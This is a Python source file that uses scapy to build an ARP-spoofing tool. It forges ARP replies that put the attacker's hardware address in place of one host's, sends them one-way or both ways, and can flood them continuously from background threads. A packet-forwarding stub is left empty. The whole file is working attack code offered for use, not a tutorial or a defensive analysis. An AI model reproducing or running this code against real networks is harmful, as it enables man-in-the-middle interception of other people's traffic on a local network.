import scapy.layers.l2
from scapy.all import *
from DataStructures import Host
from threading import Thread


class AttackTools:
    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        # TODO: Add error detection
        ether_index = 0
        arp_index = 1

        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @staticmethod
    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, flood: bool):
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2)

        if flood:
            poisoners = [Poisoner(arp1)]
            poisoners[0].poison()

        if flood and bidirectional:
            poisoners.append(Poisoner(arp2))
            poisoners[1].poison()

        if flood:
            return poisoners


class Poisoner:
    def __init__(self, pkt):
        self.thread = threading.Thread
        self.killed = False
        self.pkt = pkt

    def poison(self):
        self.thread = Thread(target=self.sendp_flood, args=(self.pkt,))
        self.thread.start()

    def is_killed(self):
        return self.killed

    def kill(self):
        self.killed = True

    def get_thread(self):
        return self.thread

    # TODO: Convert from class method to instance method
    def sendp_flood(self, pkt):
        while True:
            sendp(pkt, verbose=False)
            if self.is_killed():
                break

    def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
        pass
